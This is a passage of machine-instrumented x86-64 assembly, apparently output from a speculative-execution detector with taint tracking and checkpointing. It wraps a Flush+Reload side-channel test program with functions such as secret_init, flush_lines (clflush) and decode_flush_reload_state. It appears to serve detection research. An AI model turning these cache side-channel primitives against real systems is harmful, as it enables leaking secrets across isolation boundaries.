            movq %rdx,(scratchpad+524312)
            movq %rax,(scratchpad+524328)
            lahf 
            seto %al
            movq %rax,(scratchpad+524320)
            movq (scratchpad+524328),%rax
            movabsq $scratchpad,%rax
            movabsq $35184372088832,%rcx
            movq (%rax),%rbx
            xorq %rcx,%rbx
            movb (%rbx),%bl
            movabsq $dift_reg_tags,%rdx
            orb 6(%rdx),%bl
            movb %bl,(%rdx)
            xorq 8(%rax),%rcx
            orb (%rcx),%bl
            movb %bl,(%rdx)
            movq %rax,(scratchpad+524328)
            movq (scratchpad+524320),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524328),%rax
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad)
            leaq (.__trampoline__8102deb9_fe07_4f28_9772_f41855e0b4e1__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___927)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__8102deb9_fe07_4f28_9772_f41855e0b4e1__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+16)
            movq (scratchpad),%rax
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___927:

            nop
            jne .L_1366

            addq $40,%rsp
.cfi_remember_state 
.cfi_def_cfa_offset 8
            movq %rax,(scratchpad+524288)
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movb $0,(%rax)
            movq (scratchpad+524288),%rax
            retq 
.L_1350:

.cfi_restore_state 
            leaq (.L_2004)(%rip),%rdi
            movabsq $dift_reg_tags,%r12
            movb $0,5(%r12)
            callq perror@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_set_heap_limit__7145636e_dc08_4f64_b62f_2ca04a333ff8__teapot__

            movl $1,%edi
            movq %rax,(scratchpad+524288)
            movq %rax,(scratchpad+524304)
            lahf 
            seto %al
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524304),%rax
            movabsq $dift_reg_tags,%rax
            movb $0,5(%rax)
            movq %rax,(scratchpad+524304)
            movq (scratchpad+524296),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524304),%rax
            movq (scratchpad+524288),%rax
            callq exit@PLT
.L_1366:

            callq __stack_chk_fail@PLT
.cfi_endproc 
.size set_heap_limit, . - set_heap_limit
#-----------------------------------
.globl secret_init
.type secret_init, @function
#-----------------------------------
secret_init:

.cfi_startproc 
.cfi_lsda 255
.cfi_personality 255
.cfi_def_cfa 7, 8
.cfi_offset 16, -8
            movq %rsp,%rdi
            shrq $3,%rdi
            leaq 2147450880(%rdi),%rdi
            movb $255,(%rdi)
            endbr64 
            leaq -8(%rsp),%rdi
            movq %rdi,(scratchpad)
            pushq %rbx
.cfi_def_cfa_offset 16
.cfi_offset 3, -16
            leaq (array_size)(%rip),%rdi
            movq %rdi,(scratchpad+8)
            movl (array_size)(%rip),%edi
            movl %edi,%edi
            movq %rax,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            movq %rdx,(scratchpad+524304)
            movq %rsi,(scratchpad+524312)
            movq %rdi,(scratchpad+524320)
            movabsq $dift_reg_tags,%rdx
            movzbl 1(%rdx),%ebx
            movabsq $scratchpad,%rcx
            movabsq $35184372088832,%rax
            movq (%rcx),%rsi
            xorq %rax,%rsi
            movabsq $72340172838076673,%rdi
            imulq %rbx,%rdi
            movq %rdi,(%rsi)
            xorq 8(%rcx),%rax
            movb (%rax),%dil
            movb %dil,5(%rdx)
            movq (scratchpad+524320),%rdi
            movq (scratchpad+524312),%rsi
            movq (scratchpad+524304),%rdx
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rax
            callq malloc@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_secret_init__47750739_4dbe_4b09_814d_88018b305708__teapot__

            movq %rax,%rbx
            testq %rax,%rax
            movq %rax,(scratchpad+524288)
            movq %rax,(scratchpad+524304)
            lahf 
            seto %al
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524304),%rax
            movabsq $dift_reg_tags,%rax
            movb (%rax),%dil
            movb %dil,1(%rax)
            movq %rax,(scratchpad+524304)
            movq (scratchpad+524296),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524304),%rax
            movq (scratchpad+524288),%rax
            leaq (.__trampoline__47750739_4dbe_4b09_814d_88018b305708__teapot__)(%rip),%rdi
            movq %rdi,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___938)(%rip),%rdi
            movq %rdi,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__47750739_4dbe_4b09_814d_88018b305708__teapot__)(%rip),%rdi
            movq %rdi,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___938:

            nop
            je .L_13a6

            leaq (%rax),%rdi
            movq %rdi,(scratchpad)
            movb $65,(%rax)
            movq %rax,%rdx
            leaq (.L_202b)(%rip),%rsi
            movl $1,%edi
            movl $0,%eax
            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            movq %rdx,(scratchpad+524304)
            movabsq $dift_reg_tags,%rbx
            movb (%rbx),%dl
            movabsq $scratchpad,%rcx
            movabsq $35184372088832,%rax
            xorq (%rcx),%rax
            movb %dl,(%rax)
            movb (%rbx),%dl
            movb %dl,3(%rbx)
            movw $0,4(%rbx)
            movb $0,(%rbx)
            movq (scratchpad+524304),%rdx
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            callq __printf_chk__dift_wrapper__@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_secret_init__19814f19_28fe_401c_a0bd_cf2dca4fd3d5__teapot__
.L_13a1:

            movq %rbx,%rax
            leaq (%rsp),%rbx
            movq %rbx,(scratchpad)
            popq %rbx
.cfi_remember_state 
.cfi_def_cfa_offset 8
            movq %rax,(scratchpad+524288)
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movb $0,(%rax)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movabsq $dift_reg_tags,%rax
            movb 1(%rax),%cl
            movb %cl,(%rax)
            movabsq $scratchpad,%rcx
            movabsq $35184372088832,%rbx
            xorq (%rcx),%rbx
            movb (%rbx),%cl
            movb %cl,1(%rax)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.L_13a6:

.cfi_restore_state 
            leaq (.L_2015)(%rip),%rdi
            movabsq $dift_reg_tags,%rax
            movb $0,5(%rax)
            callq perror@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_secret_init__7cb22c7a_d2bd_47d1_a87a_953a40ef4a41__teapot__

            jmp .L_13a1
.cfi_endproc 
.size secret_init, . - secret_init
.align 4
#-----------------------------------
.globl array_init
.type array_init, @function
#-----------------------------------
array_init:

.cfi_startproc 
.cfi_lsda 255
.cfi_personality 255
.cfi_def_cfa 7, 8
.cfi_offset 16, -8
            movq %rsp,%rdi
            shrq $3,%rdi
            leaq 2147450880(%rdi),%rdi
            movb $255,(%rdi)
            endbr64 
            leaq -8(%rsp),%rdi
            movq %rdi,(scratchpad)
            pushq %rbx
.cfi_def_cfa_offset 16
.cfi_offset 3, -16
            leaq (array_size)(%rip),%rdi
            movq %rdi,(scratchpad+8)
            movl (array_size)(%rip),%edi
            movl %edi,%edi
            movq %rax,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            movq %rdx,(scratchpad+524304)
            movq %rsi,(scratchpad+524312)
            movq %rdi,(scratchpad+524320)
            movabsq $dift_reg_tags,%rdx
            movzbl 1(%rdx),%ebx
            movabsq $scratchpad,%rcx
            movabsq $35184372088832,%rax
            movq (%rcx),%rsi
            xorq %rax,%rsi
            movabsq $72340172838076673,%rdi
            imulq %rbx,%rdi
            movq %rdi,(%rsi)
            xorq 8(%rcx),%rax
            movb (%rax),%dil
            movb %dil,5(%rdx)
            movq (scratchpad+524320),%rdi
            movq (scratchpad+524312),%rsi
            movq (scratchpad+524304),%rdx
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rax
            callq malloc@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_array_init__fa28af4d_7400_489c_a6f6_2260c9c35214__teapot__

            movq %rax,%rbx
            testq %rax,%rax
            movq %rax,(scratchpad+524288)
            movq %rax,(scratchpad+524304)
            lahf 
            seto %al
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524304),%rax
            movabsq $dift_reg_tags,%rax
            movb (%rax),%dil
            movb %dil,1(%rax)
            movq %rax,(scratchpad+524304)
            movq (scratchpad+524296),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524304),%rax
            movq (scratchpad+524288),%rax
            leaq (.__trampoline__fa28af4d_7400_489c_a6f6_2260c9c35214__teapot__)(%rip),%rdi
            movq %rdi,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___953)(%rip),%rdi
            movq %rdi,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__fa28af4d_7400_489c_a6f6_2260c9c35214__teapot__)(%rip),%rdi
            movq %rdi,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___953:

            nop
            je .L_1401

            leaq (array_size)(%rip),%rdi
            movq %rdi,(scratchpad)
            movl (array_size)(%rip),%edx
            movl %edx,%edx
            movl $45,%esi
            movq %rax,%rdi
            movq %rbx,(scratchpad+524288)
            movabsq $scratchpad,%rbx
            movabsq $35184372088832,%rax
            xorq (%rbx),%rax
            movb (%rax),%bl
            movabsq $dift_reg_tags,%rax
            movb %bl,3(%rax)
            movb $0,4(%rax)
            movb (%rax),%bl
            movb %bl,5(%rax)
            movq (scratchpad+524288),%rbx
            callq memset__dift_wrapper__@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_array_init__fddc7a08_641a_4520_a556_ca2a10fef480__teapot__

            movq %rbx,%rdx
            leaq (.L_2042)(%rip),%rsi
            movl $1,%edi
            movl $0,%eax
            movq %rbx,(scratchpad+524288)
            movabsq $dift_reg_tags,%rbx
            movb 1(%rbx),%al
            movb %al,3(%rbx)
            movw $0,4(%rbx)
            movb $0,(%rbx)
            movq (scratchpad+524288),%rbx
            callq __printf_chk__dift_wrapper__@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_array_init__6c94379d_7706_46f5_a1ca_b0560cda7a49__teapot__
.L_13fc:

            movq %rbx,%rax
            leaq (%rsp),%rbx
            movq %rbx,(scratchpad)
            popq %rbx
.cfi_remember_state 
.cfi_def_cfa_offset 8
            movq %rax,(scratchpad+524288)
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movb $0,(%rax)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movabsq $dift_reg_tags,%rax
            movb 1(%rax),%cl
            movb %cl,(%rax)
            movabsq $scratchpad,%rcx
            movabsq $35184372088832,%rbx
            xorq (%rcx),%rbx
            movb (%rbx),%cl
            movb %cl,1(%rax)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.L_1401:

.cfi_restore_state 
            leaq (.L_2015)(%rip),%rdi
            movabsq $dift_reg_tags,%rax
            movb $0,5(%rax)
            callq perror@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_array_init__73b53f4b_ff86_42ce_93ea_e27f54d753db__teapot__

            jmp .L_13fc
.cfi_endproc 
.size array_init, . - array_init
#-----------------------------------
.globl otherArray_init
.type otherArray_init, @function
#-----------------------------------
otherArray_init:

.cfi_startproc 
.cfi_lsda 255
.cfi_personality 255
.cfi_def_cfa 7, 8
.cfi_offset 16, -8
            movq %rax,(scratchpad+524288)
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movb $255,(%rax)
            movq (scratchpad+524288),%rax
            endbr64 
            movq %rax,(scratchpad+524288)
            leaq -8(%rsp),%rax
            movq %rax,(scratchpad)
            movq (scratchpad+524288),%rax
            pushq %r13
.cfi_def_cfa_offset 16
.cfi_offset 13, -16
            leaq -8(%rsp),%r13
            movq %r13,(scratchpad+8)
            pushq %r12
.cfi_def_cfa_offset 24
.cfi_offset 12, -24
            leaq -8(%rsp),%r12
            movq %r12,(scratchpad+16)
            pushq %rbp
.cfi_def_cfa_offset 32
.cfi_offset 6, -32
            leaq -8(%rsp),%r12
            movq %r12,(scratchpad+24)
            pushq %rbx
.cfi_def_cfa_offset 40
.cfi_offset 3, -40
            subq $8,%rsp
.cfi_def_cfa_offset 48
            movl %esi,%ebp
            movl %edx,%r13d
            movl %edi,%r12d
            movq %r12,%rdi
            movq %rax,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            movq %rdx,(scratchpad+524304)
            movq %rsi,(scratchpad+524312)
            movq %rdi,(scratchpad+524320)
            movabsq $dift_reg_tags,%rdi
            movzbl 13(%rdi),%ebx
            movabsq $scratchpad,%rdx
            movabsq $35184372088832,%rax
            movq (%rdx),%rsi
            xorq %rax,%rsi
            movabsq $72340172838076673,%rcx
            imulq %rcx,%rbx
            movq %rbx,(%rsi)
            movzbl 12(%rdi),%ebx
            movq 8(%rdx),%rsi
            xorq %rax,%rsi
            imulq %rcx,%rbx
            movq %rbx,(%rsi)
            movzbl 7(%rdi),%ebx
            movq 16(%rdx),%rsi
            xorq %rax,%rsi
            imulq %rcx,%rbx
            movq %rbx,(%rsi)
            movzbl 1(%rdi),%ebx
            xorq 24(%rdx),%rax
            imulq %rcx,%rbx
            movq %rbx,(%rax)
            movb 3(%rdi),%bl
            movb 4(%rdi),%cl
            movb %cl,7(%rdi)
            movb %bl,13(%rdi)
            movb 5(%rdi),%bl
            movb %bl,12(%rdi)
            movq (scratchpad+524320),%rdi
            movq (scratchpad+524312),%rsi
            movq (scratchpad+524304),%rdx
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rax
            callq malloc@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_otherArray_init__643980ef_5071_4300_a67b_3238470ceaf1__teapot__

            movq %rax,%rbx
            testq %rax,%rax
            movq %rax,(scratchpad+524288)
            movq %rax,(scratchpad+524304)
            lahf 
            seto %al
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524304),%rax
            movabsq $dift_reg_tags,%rax
            movb (%rax),%dil
            movb %dil,1(%rax)
            movq %rax,(scratchpad+524304)
            movq (scratchpad+524296),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524304),%rax
            movq (scratchpad+524288),%rax
            leaq (.__trampoline__643980ef_5071_4300_a67b_3238470ceaf1__teapot__)(%rip),%rdi
            movq %rdi,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___972)(%rip),%rdi
            movq %rdi,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__643980ef_5071_4300_a67b_3238470ceaf1__teapot__)(%rip),%rdi
            movq %rdi,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___972:

            nop
            je .L_1472

            movq %r12,%rdx
            movl $45,%esi
            movq %rax,%rdi
            movq %rbx,(scratchpad+524288)
            movabsq $dift_reg_tags,%rbx
            movb (%rbx),%al
            movb 12(%rbx),%r12b
            movb %r12b,3(%rbx)
            movb $0,4(%rbx)
            movb %al,5(%rbx)
            movq (scratchpad+524288),%rbx
            callq memset__dift_wrapper__@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_otherArray_init__1fc018ef_6d86_4e98_a273_c7541f5de497__teapot__

            movl %ebp,%ebp
            leaq (%rbx,%rbp),%r12
            movq %r12,(scratchpad)
            movb %r13b,(%rbx,%rbp)
            movq %rbx,%rdx
            leaq (.L_203c)(%rip),%rsi
            movl $1,%edi
            movl $0,%eax
            movabsq $dift_reg_tags,%r12
            movb 13(%r12),%bpl
            orb 7(%r12),%bpl
            orb 1(%r12),%bpl
            movabsq $scratchpad,%r13
            movabsq $35184372088832,%rax
            xorq (%r13),%rax
            movb %bpl,(%rax)
            movb 1(%r12),%bpl
            movb %bpl,3(%r12)
            movw $0,4(%r12)
            movb $0,(%r12)
            callq __printf_chk__dift_wrapper__@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_otherArray_init__cefd4c2d_ebe6_4bb3_a111_64de12342510__teapot__
.L_1464:

            movq %rbx,%rax
            addq $8,%rsp
.cfi_remember_state 
.cfi_def_cfa_offset 40
            leaq (%rsp),%r12
            movq %r12,(scratchpad)
            popq %rbx
.cfi_def_cfa_offset 32
            leaq (%rsp),%r12
            movq %r12,(scratchpad+8)
            popq %rbp
.cfi_def_cfa_offset 24
            leaq (%rsp),%r12
            movq %r12,(scratchpad+16)
            popq %r12
.cfi_def_cfa_offset 16
            leaq (%rsp),%r13
            movq %r13,(scratchpad+24)
            popq %r13
.cfi_def_cfa_offset 8
            movq %rax,(scratchpad+524288)
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movb $0,(%rax)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rdx,(scratchpad+524312)
            movq %rsi,(scratchpad+524320)
            movabsq $dift_reg_tags,%rdx
            movb 1(%rdx),%sil
            movb %sil,(%rdx)
            movabsq $scratchpad,%rcx
            movabsq $35184372088832,%rbx
            movq (%rcx),%rax
            xorq %rbx,%rax
            movb (%rax),%sil
            movb %sil,1(%rdx)
            movq 8(%rcx),%rsi
            xorq %rbx,%rsi
            movb (%rsi),%sil
            movb %sil,7(%rdx)
            movq 16(%rcx),%rsi
            xorq %rbx,%rsi
            movb (%rsi),%sil
            movb %sil,12(%rdx)
            xorq 24(%rcx),%rbx
            movb (%rbx),%sil
            movb %sil,13(%rdx)
            movq (scratchpad+524320),%rsi
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.L_1472:

.cfi_restore_state 
            leaq (.L_2015)(%rip),%rdi
            movabsq $dift_reg_tags,%r12
            movb $0,5(%r12)
            callq perror@PLT

            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__ret_transform_target_otherArray_init__0d85d26e_8f72_49cf_9e08_7eb0dc2322cc__teapot__

            jmp .L_1464
.cfi_endproc 
.size otherArray_init, . - otherArray_init

            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
            nop
.align 16
#-----------------------------------
.globl random_char
.type random_char, @function
#-----------------------------------
random_char:

.cfi_startproc 
.cfi_lsda 255
.cfi_personality 255
.cfi_def_cfa 7, 8
.cfi_offset 16, -8
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movb $255,(%rax)
            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__indbr_transform_target_random_char__2257313e_2203_45cc_8bda_37d09ce90e24__teapot__

            endbr64 
            movl $90,%eax
            movq %rax,(scratchpad+524288)
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movb $0,(%rax)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movabsq $dift_reg_tags,%rax
            movb $0,(%rax)
            movq (scratchpad+524288),%rax
            retq 
.cfi_endproc 
.size random_char, . - random_char
.align 2
#-----------------------------------
.globl csel
.type csel, @function
#-----------------------------------
csel:

.cfi_startproc 
.cfi_lsda 255
.cfi_personality 255
.cfi_def_cfa 7, 8
.cfi_offset 16, -8
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movb $255,(%rax)
            xchgq %rbx,%rbx
            nop
            cmpq $0,(checkpoint_cnt)
            jne .L__indbr_transform_target_csel__910821e3_3a21_4274_94f8_869f25df71ab__teapot__

            endbr64 
            movq %rdi,%rax
            movzbl %dl,%edx
            movq %rdx,%rdi
            negq %rdi
            andq %rax,%rdi
            subq $1,%rdx
            andq %rsi,%rdx
            movq %rdi,%rax
            orq %rdx,%rax
            movq %rax,(scratchpad+524288)
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movb $0,(%rax)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rdx,(scratchpad+524312)
            movabsq $dift_reg_tags,%rbx
            movb 3(%rbx),%cl
            movb 5(%rbx),%dl
            movl %ecx,%eax
            orb %dl,%al
            movb %al,5(%rbx)
            orb 4(%rbx),%cl
            movb %cl,3(%rbx)
            orb %dl,%cl
            movb %cl,(%rbx)
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.cfi_endproc 
.size csel, . - csel
#-----------------------------------
.globl flush_lines
.type flush_lines, @function
#-----------------------------------
flush_lines:

.cfi_startproc 
.cfi_lsda 255
.cfi_personality 255
.cfi_def_cfa 7, 8
.cfi_offset 16, -8
            movq %rax,(scratchpad+524288)
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movb $255,(%rax)
            movq (scratchpad+524288),%rax
            endbr64 
            testq %rdx,%rdx
            movq %rax,(scratchpad)
            leaq (.__trampoline__a8f5131e_ffeb_4256_8f88_ea03495e84ce__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___995)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__a8f5131e_ffeb_4256_8f88_ea03495e84ce__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+16)
            movq (scratchpad),%rax
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___995:

            nop
            je .L_14c8

            movabsq $dift_reg_tags,%rax
            movb $0,(%rax)
            movl $0,%eax
.L_14b9:

            clflush (%rdi)
            addq $1,%rax
            addq %rsi,%rdi
            cmpq %rax,%rdx
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rax,(scratchpad+524312)
            lahf 
            seto %al
            movq %rax,(scratchpad+524304)
            movq (scratchpad+524312),%rax
            movabsq $dift_reg_tags,%rax
            movb 4(%rax),%bl
            orb %bl,5(%rax)
            movq %rax,(scratchpad+524312)
            movq (scratchpad+524304),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524312),%rax
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad)
            leaq (.__trampoline__969e3e57_33e8_48a3_8dab_5c922b275781__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___998)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__969e3e57_33e8_48a3_8dab_5c922b275781__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+16)
            movq (scratchpad),%rax
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___998:

            nop
            jne .L_14b9
.L_14c8:

            movq %rax,(scratchpad+524288)
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movb $0,(%rax)
            movq (scratchpad+524288),%rax
            retq 
.cfi_endproc 
.size flush_lines, . - flush_lines
#-----------------------------------
.globl decode_flush_reload_state
.type decode_flush_reload_state, @function
#-----------------------------------
decode_flush_reload_state:

.cfi_startproc 
.cfi_lsda 255
.cfi_personality 255
.cfi_def_cfa 7, 8
.cfi_offset 16, -8
            movq %rax,(scratchpad+524288)
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movb $255,(%rax)
            movq (scratchpad+524288),%rax
            endbr64 
            movq %rax,(scratchpad+524288)
            leaq -8(%rsp),%rax
            movq %rax,(scratchpad)
            movq (scratchpad+524288),%rax
            pushq %r14
.cfi_def_cfa_offset 16
.cfi_offset 14, -16
            leaq -8(%rsp),%r14
            movq %r14,(scratchpad+8)
            pushq %r13
.cfi_def_cfa_offset 24
.cfi_offset 13, -24
            leaq -8(%rsp),%r13
            movq %r13,(scratchpad+16)
            pushq %r12
.cfi_def_cfa_offset 32
.cfi_offset 12, -32
            leaq -8(%rsp),%r12
            movq %r12,(scratchpad+24)
            pushq %rbp
.cfi_def_cfa_offset 40
.cfi_offset 6, -40
            leaq -8(%rsp),%r12
            movq %r12,(scratchpad+32)
            pushq %rbx
.cfi_def_cfa_offset 48
.cfi_offset 3, -48
            movq %rdi,%r14
            cmpq $1,%rdx
            movq %rax,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            movq %rax,(scratchpad+524312)
            lahf 
            seto %al
            movq %rax,(scratchpad+524304)
            movq (scratchpad+524312),%rax
            movabsq $dift_reg_tags,%rbp
            movzbl 14(%rbp),%r13d
            movabsq $scratchpad,%r12
            movabsq $35184372088832,%rbx
            movq (%r12),%rcx
            xorq %rbx,%rcx
            movabsq $72340172838076673,%rax
            imulq %rax,%r13
            movq %r13,(%rcx)
            movzbl 13(%rbp),%ecx
            movq 8(%r12),%r13
            xorq %rbx,%r13
            imulq %rax,%rcx
            movq %rcx,(%r13)
            movzbl 12(%rbp),%ecx
            movq 16(%r12),%r13
            xorq %rbx,%r13
            imulq %rax,%rcx
            movq %rcx,(%r13)
            movzbl 7(%rbp),%ecx
            movq 24(%r12),%r13
            xorq %rbx,%r13
            imulq %rax,%rcx
            movq %rcx,(%r13)
            movzbl 1(%rbp),%ecx
            xorq 32(%r12),%rbx
            imulq %rax,%rcx
            movq %rcx,(%rbx)
            movb 5(%rbp),%bl
            movb %bl,14(%rbp)
            movq %rax,(scratchpad+524312)
            movq (scratchpad+524304),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524312),%rax
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rax
            leaq (.__trampoline__acbc9192_05a6_4210_b951_911c97f79d8a__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___1007)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__acbc9192_05a6_4210_b951_911c97f79d8a__teapot__)(%rip),%r12
            movq %r12,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___1007:

            nop
            jbe .L_1522

            movl $1,%eax
            movl $0,%r12d
            movl $0,%ebp
            movl $0,%r13d
            movl $0,%ebx
            movabsq $dift_reg_tags,%rcx
            movw $0,(%rcx)
            movw $0,12(%rcx)
            movb $0,7(%rcx)
            jmp .L_150c
.L_14fb:

            addq $1,%rax
            cmpq %rax,%rdx
            movq %rax,(scratchpad)
            leaq (.__trampoline__3397588c_3241_4448_966e_9b44c092b5e5__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___1009)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__3397588c_3241_4448_966e_9b44c092b5e5__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+16)
            movq (scratchpad),%rax
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___1009:

            nop
            jbe .L_1538

            cmpq $255,%rax
            movq %rax,(scratchpad)
            leaq (.__trampoline__138b325c_5fe9_4a1a_b86e_20f81eb2c3da__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___1010)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__138b325c_5fe9_4a1a_b86e_20f81eb2c3da__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+16)
            movq (scratchpad),%rax
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___1010:

            nop
            ja .L_1538
.L_150c:

            leaq (%rsi,%rax,8),%rcx
            movq %rcx,(scratchpad)
            movq (%rsi,%rax,8),%rcx
            cmpq %rbx,%rcx
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rdx,(scratchpad+524312)
            movq %rax,(scratchpad+524328)
            lahf 
            seto %al
            movq %rax,(scratchpad+524320)
            movq (scratchpad+524328),%rax
            movabsq $dift_reg_tags,%rax
            movb 4(%rax),%cl
            orb (%rax),%cl
            movabsq $scratchpad,%rbx
            movabsq $35184372088832,%rdx
            xorq (%rbx),%rdx
            orb (%rdx),%cl
            movb %cl,2(%rax)
            movq %rax,(scratchpad+524328)
            movq (scratchpad+524320),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524328),%rax
            movq (scratchpad+524312),%rdx
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad)
            leaq (.__trampoline__ae20bfba_6a9b_4b3c_9285_d5eeec099e7e__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata)
